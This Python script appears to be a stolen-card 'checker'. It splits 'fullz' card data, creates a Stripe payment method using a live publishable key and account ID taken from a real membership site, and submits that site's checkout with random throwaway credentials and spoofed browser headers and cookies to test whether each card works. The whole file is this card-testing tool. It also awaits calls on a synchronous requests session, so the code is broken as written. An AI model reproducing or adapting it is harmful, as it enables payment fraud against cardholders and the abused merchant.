import asyncio
import random
import string
from fake_useragent import UserAgent
import requests
from FUNC.defs import *
import re
from bs4 import BeautifulSoup

session = requests.session()

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def generate_random_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
    domain = random.choice(domains)
    username = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    return f"{username}@{domain}"

async def create_cvv_charge(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        ano = ano[-2:]  # Convert year to 2-digit format

        # Generate user details
        email = generate_random_email()
        username = 'user_' + ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        password = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=12))

        # Step 1: Create Stripe payment method
        API_STRIPE = "pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX"
        headers1 = {
            'Host': 'api.stripe.com',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'
        }
        data1 = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': '1fa816a3-cb1f-4128-be42-7282b81afcb1a3a78f',
            'muid': '7f46e3e6-1b8c-493a-9d4b-5fde0f8c25d1d76045',
            'sid': '7a3d84d5-adb1-422b-a174-93f94b609dff13111e',
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/3b6d306271; stripe-js-v3/3b6d306271; split-card-element',
            'referrer': 'https://937footballinsider.com',
            'time_on_page': '26176',
            'key': API_STRIPE,
            '_stripe_account': 'acct_1KHCEQEOdymRpNEG'
        }
        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1)
        if 'error' in response.text:
            return f"Stripe Error: {response.json()['error']['message']}"
        payment_method_id = response.json()['id']

        # Step 2: Submit membership checkout
        headers2 = {
            'authority': '937footballinsider.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'asp_transient_id=bd5da2ddc9e7b772a65c25db5fae3af9;PHPSESSID=uglqu0rrbksib0lcb0stqptko0;pmpro_visit=1;__stripe_mid=7f46e3e6-1b8c-493a-9d4b-5fde0f8c25d1d76045;__stripe_sid=7a3d84d5-adb1-422b-a174-93f94b609dff13111e',
            'origin': 'https://937footballinsider.com',
            'referer': 'https://937footballinsider.com/membership-account/membership-checkout/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        card_type = 'VISA' if cc.startswith('4') else 'MASTERCARD' if cc.startswith('5') else 'AMEX' if cc.startswith('3') else 'DISCOVER' if cc.startswith('6') else 'UNKNOWN'
        data2 = {
            'level': '1',
            'checkjavascript': '1',
            'username': username,
            'password': password,
            'password2': password,
            'bemail': email,
            'bconfirmemail': email,
            'fullname': '',
            'CardType': card_type,
            'submit-checkout': '1',
            'javascriptok': '1',
            'payment_method_id': payment_method_id,
            'AccountNumber': 'XXXXXXXXXXXX' + cc[-4:],
            'ExpirationMonth': mes,
            'ExpirationYear': ano
        }
        response = await session.post(
            'https://937footballinsider.com/membership-account/membership-checkout/',
            headers=headers2,
            data=data2
        )

        print(response.text)
        return response

    except Exception as e:
        return str(e)
    



